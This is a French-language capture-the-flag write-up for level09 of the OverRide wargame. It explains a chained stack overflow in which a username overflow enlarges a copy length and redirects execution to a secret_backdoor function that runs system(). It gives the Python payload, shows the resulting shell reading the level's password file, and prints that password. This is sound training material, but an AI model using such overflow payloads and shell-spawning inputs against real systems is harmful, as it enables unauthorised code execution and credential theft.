1 -- OBJECTIF

        Dans ce niveau nous allons nous servir d'une sorte de buffer overflow afin de reecrire le EIP de sortie de la fonction handle_msg

2 -- RECHERCHE DE LA FAILLE

        on remarque la presence d'une structure dans la stackframe de la fonction handle_msg()

        typedef struct  g_var 
        {
            char message[140];
            char username[40];
            int  strncpy_n;
        }               t_var;

        on remarque ensuite que la fonction set_username(t_var *var)
        boucle 41 fois afin de recopier ce que l'utilisateur au sein de t_var->username

        while (++i < 41 && s[i])
            var->username[i] = s[i];

        il s'agit d'un overflow et l'on va donc pourvoir s'en servir afin de reecrire strncpy_n
        initialise par default sur 140

        On remarque ensuite que la fonction set_msg(t_var *var) ce sers de la valeur contenu dans strncpy_n pour reecrire autant de caractere dans t_var->message
        vu qu'il nous est possible de le reecrire nous allons pouvoir nous en servir afin de generer un 2eme overflow plus important.

        la taille de reecriture peut etre deviner en regardant la stackframe a l'aide de GDB.

        la structure de stackframe en arrivant dans la fonction handle_msg() ressemble a quelquechose de ce genre

        [                typedef struct  g_var                ][*][MAIN EBP]| [MAIN EIP]
                        184 octect                             8      8    |

        en regardant la structure de la stackframe de handle_msg on remarque qu'il va nous valloir reecrire 208 caractere (192 t_var + 8 space + 8 EIP) soit /xD0

        maintenant que nous avons une possibiliter de reecrire l'EIP il nous faut rediriger le flux du programme.
        on remarque que le programme contient une fonction appeler secret_backdoor qui lance la command system() avec comme instruction une chaine de caractere transmit par l'utilisateur

        il nous suffit donc de rediriger le flux su cette fonction

        (gdb) x secret_backdoor
        0x55555555488c <secret_backdoor>:	0xe5894855

3 -- EXPLOITATION DE LA FAILLE


        cat <(python -c 'print("A" * 40 + "\xD0" + "\n" + 200 * "B" + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n")')

        "A" * 40                            --> bourrage du premier fgets
        "\xD0"                              --> exploitation de l'overflow de la fonction set_username | remplacement de la valeur strncpy_n 140 --> 208
        "\n"                                --> valide le premier fgets
        200 * "B"                           --> bourrage jusqu'a l'EIP en ce servant de l'overflow du strncpy de la fonction set_msg
        "\x8c\x48\x55\x55\x55\x55\x00\x00"  --> remplacement de l'EIP par l'addresse de la fonction secret_backdoor
        "\n"                                --> validation du 2eme fgets
        "/bin/sh\n"                         --> remplissage de la string appeler par la commade system + validation du fgets


        level09@OverRide:~$ cat <(python -c 'print("A" * 40 + "\xD0" + "\n" + 200 * "B" + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n")') - | ./level09
        --------------------------------------------
        |   ~Welcome to l33t-m$n ~    v1337        |
        --------------------------------------------
        >: Enter your username
        >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½>: Msg @Unix-Dude
        >>: >: Msg sent!
        cat /home/users/end/.pass
        j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

4 -- OBTENIR LE TOKEN

        cat <(python -c 'print("A" * 40 + "\xD0" + "\n" + 200 * "B" + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n")') - | ./level09
        cat /home/users/end/.pass
